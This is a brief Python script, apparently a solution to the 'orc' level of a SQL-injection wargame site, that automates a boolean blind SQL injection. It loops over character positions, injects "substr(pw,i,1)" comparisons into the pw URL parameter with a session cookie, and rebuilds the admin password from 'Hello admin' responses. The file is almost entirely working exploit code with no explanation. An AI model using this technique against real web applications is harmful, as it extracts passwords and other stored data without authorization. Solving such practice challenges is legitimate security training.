import requests
import string

pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
cookies = {'PHPSESSID':'di7sq95615k17gofpq7l55mqvf'}
for i in range(1,9):
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
    for j in a:
        url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or substr(pw,"+str(i)+',1)="'+str(j)+'"-- - '
        res=requests.get(url,cookies=cookies)
        res=res.text
        if "Hello admin" in res:
            pw+=j
            break
        else: pass
print(pw)
    
